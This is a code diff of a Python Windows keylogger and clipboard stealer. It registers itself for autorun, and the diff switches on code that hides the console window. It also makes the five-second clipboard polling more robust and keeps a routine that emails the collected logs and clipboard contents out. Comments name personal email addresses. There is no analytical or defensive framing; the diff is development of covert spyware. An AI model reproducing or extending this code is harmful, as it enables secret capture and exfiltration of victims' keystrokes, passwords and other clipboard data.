@@ -37,11 +37,11 @@ def handle_crash():
 
 autorun.AddToRegistry('log_file.exe')
 
-# hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
-# if hwnd != 0:      
-#     ctypes.windll.user32.ShowWindow(hwnd, 0)      
-#     ctypes.windll.kernel32.CloseHandle(hwnd)
-#     _, pid = win32process.GetWindowThreadProcessId(hwnd)
+hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
+if hwnd != 0:      
+    ctypes.windll.user32.ShowWindow(hwnd, 0)      
+    ctypes.windll.kernel32.CloseHandle(hwnd)
+    _, pid = win32process.GetWindowThreadProcessId(hwnd)
 
 print('program started')
 img_count = 1
@@ -55,11 +55,14 @@ if not os.path.exists('datafile.txt'):
 
 def clipboard_listener():
     global temp_data, clipboard_data
-    # print(temp_data)
-    if temp_data != pyperclip.paste():
-        temp_data = pyperclip.paste()
-        clipboard_data += f'\n\n{pyperclip.paste()}'
-        print(f'clipboard data: {clipboard_data}')
+    try:
+        if temp_data != pyperclip.paste():
+            temp_data = pyperclip.paste()
+            clipboard_data += f'\n\n{pyperclip.paste()}'
+            # print(f'clipboard data: {clipboard_data}')
+    except:
+        time.sleep(2)
+        clipboard_listener()
     mytimer = Timer(interval=5, function = clipboard_listener)
     mytimer.daemon = True
     mytimer.start()      
@@ -158,8 +161,7 @@ def main_func():
                 print(self.log, file=f)
             print(f"[+] Saved {self.filename}.txt")
 
-        def sendmail(self, email, password, message):
-            
+        def sendmail(self, email, password, message):            
             global clipboard_data
             if not os.path.exists(os.path.join('C://', 'temp')):
                 os.mkdir(os.path.join('C://', 'temp'))
@@ -175,6 +177,7 @@ def main_func():
             # msg["To"] = 'core.builder11@gmail.com'
             # Anshumankumar7890@gmail.com
             clip_data = clipboard_data
+            print(f'clip_data :{clip_data}')
             # with open('clipboard.txt', 'r+') as clip: 
             #     clip_data = clip.read()           
             #     clip.truncate(0)
